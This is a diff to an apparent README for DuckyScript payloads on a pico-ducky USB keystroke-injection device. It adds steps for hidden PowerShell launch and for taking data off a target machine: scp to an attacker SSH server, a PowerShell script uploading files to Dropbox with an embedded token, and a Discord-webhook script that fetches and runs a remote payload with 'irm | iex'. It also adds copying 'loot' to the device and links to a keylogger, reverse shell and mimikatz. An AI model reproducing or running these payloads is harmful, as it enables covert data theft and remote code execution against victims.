@@ -73,8 +73,8 @@ DELAY 1000
 `STRING` types out whatever after it **`as-is`**.
 
 ```
-STRING Hello world!
-// types out "Hello world!"
+REM Run a hidden powershell
+STRING powershell -windowstyle hidden
 ```
 
 `STRINGLN` also presses **enter key** at the end.
@@ -116,7 +116,7 @@ F1 to F24
 
 can be used on its own to emulate the Windows key or combined with special keys:
 
-`WINDOWS SHIFT s`
+`GUI r` opens Run.exe on Windows which can be used to launch applications and open links easily.
 
 These commands should help understand most payload scripts. For more detailed information on DuckyScript visit Hak5's [Official DuckyScript Guide](https://docs.hak5.org/hak5-usb-rubber-ducky/duckyscript-tm-quick-reference).
 
@@ -130,11 +130,13 @@ I have included very few example payload I found interesting mainly in the realm
 
 Exfiltration refers to extracting and transferring information from the target device to attacker via some means. 
 
+#### Transfer via SSH
+
 I used OpenSSH service and the `scp` command to send the files from the target device to a SSH server on my device. 
 
 To turn your Windows 10/11 device into a SSH Server capable of receiving data via `scp`:
 
-- Install OpenSSH Serverfrom Optional Features in Windows 11
+- Install OpenSSH Server from Optional Features in Windows 11
 - Ensure it is installed by running this command in Powershell 6 or higher:
 
   ```
@@ -169,6 +171,55 @@ This will run the SSH service until the device is shut down.
   ```
   netstat -nao | find /i '":22"'
   ```
+
+- After ensuring ssh service is running, `scp` command can be used to send files/folders into the device from a remote machine using:
+  ```
+  scp /dir/file1 /dir/file2 remote_username@remote_IP /remote_dir/folder/
+  ```
+
+For an in depth explanation of the SSH service and installation/troubleshooting process refer to this [article](https://theitbros.com/ssh-into-windows/).
+
+
+#### Other Transfer Methods
+- After verifying Internet Connection, files can be uploaded to Dropbox by using the Dropbox API token and including it in the script. This ensures no file traces exists in the target device. Below is a powershell script that uploads a specified file from the device's %temp% folder to Dropbox using its API.
+  ```
+  $TargetFilePath="/$FileName"
+  $SourceFilePath="$env:TMP\$FileName"
+  $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+  $authorization = "Bearer " + $DropBoxAccessToken
+  $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+  $headers.Add("Authorization", $authorization)
+  $headers.Add("Dropbox-API-Arg", $arg)
+  $headers.Add("Content-Type", 'application/octet-stream')
+  Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+  ```
+
+- The output file can also be uploaded to a Discord channel via a discord webhook.
+  ```
+  STRING powershell -w h -ep bypass $discord='
+
+  REM REQUIRED - Provide Discord Webhook - https://discordapp.com/api/webhooks/<webhook_id>/<token>
+  DEFINE DISCORD example.com
+  STRING DISCORD
+  
+  REM Reply example.com with YOUR LINK. The Payload should be a .ps1 script
+  STRINGLN ';irm PAYLOAD | iex
+  ```
+
+- Files may also be stored onto the physical HID pico-ducky storage itself by checking the drive letter assigned to it in the target device file system and copying the files into the drive root directory.
+  ```
+  STRING $destinationLabel = "RPI-RP2"
+  ENTER
+  STRING $destinationLetter = Get-WmiObject -Class Win32_Volume | where {$_.Label -eq $destinationLabel} | select -expand name
+  ENTER
+  STRING move-item -Path C:\Windows\Temp\loot -Destination $destinationLetter
+  ENTER  
+  ```
+
+Some more interesting payloads
+- [Ducky KeyLogger](https://github.com/hak5/usbrubberducky-payloads/tree/master/payloads/library/credentials/DuckyLogger)
+- [Persistent ReverseShell Ducky](https://github.com/drapl0n/persistentReverseDucky/tree/main)
+
 
 [MIMIkatz](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa)
 
